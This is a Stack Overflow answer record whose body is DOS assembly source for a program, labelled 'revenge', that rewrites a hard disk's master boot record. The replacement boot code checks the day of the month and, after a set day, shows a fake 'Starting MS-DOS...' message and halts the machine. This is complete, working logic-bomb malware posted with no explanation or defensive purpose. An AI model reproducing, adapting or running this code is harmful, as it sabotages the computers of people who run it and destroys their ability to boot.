{"owner":{"reputation":43,"user_id":320715,"user_type":"registered","profile_image":"https://graph.facebook.com/2140230972702803/picture?type=large","display_name":"Sawa Akisawa","link":"https://ru.stackoverflow.com/users/320715/sawa-akisawa"},"is_accepted":false,"score":0,"last_activity_date":1551841678,"creation_date":1551841678,"answer_id":952929,"question_id":934247,"body":"<pre><code>;******************************************************************\n;*                                                                *\n;*  Rewrite MBR: orig=&gt;revenge (halt after X day of month)        *\n;*                                                                *\n;*                                                                *\n;******************************************************************\n.model TINY\n.CODE\n.286\n\norg 100h\n\nstart:\n     pushf\n     pusha\n     push ds\n     push es\n\n     mov ax,cs\n     mov ds,ax\n     mov es,ax\n\n     mov dx,80h;                      ; read original MBR\n     mov cx,1;\n     mov ax,0201h;\n     mov bx, offset buff\n     int 13h;\n\n     mov di,offset buff               ; change program\n     mov si,offset MBR\n     cld\n     mov cx,offset buff-offset MBR\n     rep movsb\n\n     inc cx;                          ; write MBR\n     mov ax,0301h;\n     int 13h;\n\n     pop es\n     pop ds\n     popa\n     popf\n\n     mov ax,4c00h                     ; exit\n     int 21h\n\n\n; 10-12-95 08:33pm\n; Version 1.0\n; Master Boot Record: REVENGE\n; after MDAY each month\n; CodeLenght this programm must be less than 238 byte !\n; byte [24h]=MDAY (18H)\n\nMBR db 0FAh,02Bh,0C0h,08Eh,0D0h,08Eh,0C0h,08Eh,0D8h,0BCh,000h,07Ch,0FBh,08Bh,0F4h,0BFh\n    db 000h,07Eh,0B9h,000h,001h,0FCh,0F3h,0A5h,0E9h,000h,002h,0B0h,007h,0E6h,070h,0EBh\n    db 000h,0E4h,071h,03Ch, 018h, 07Fh,024h,0B9h,004h,000h,0BEh,0EEh,07Fh,0F6h,004h,080h\n    db 074h,014h,0F6h,044h,004h,004h,074h,00Eh,08Bh,014h,08Bh,04Ch,002h,0E8h,013h,000h\n    db 059h,0EAh,000h,07Ch,000h,000h,083h,0EEh,010h,0E2h,0E2h,0BEh,072h,07Eh,0E8h,017h\n    db 000h,0EBh,0FEh,0BBh,000h,07Ch,0BDh,005h,000h,0B8h,001h,002h,0CDh,013h,073h,007h\n    db 02Bh,0C0h,0CDh,013h,04Dh,075h,0F2h,0C3h,0B4h,00Eh,0ACh,0CDh,010h,00Ah,0C0h,075h\n    db 0F9h,0C3h,053h,074h,061h,072h,074h,069h,06Eh,067h,020h,04Dh,053h,02Dh,044h,04Fh\n    db 053h,02Eh,02Eh,02Eh,00Dh,00Ah,000\n\nbuff db 516 dup (?)\n\nEND start\n</code></pre>\n"}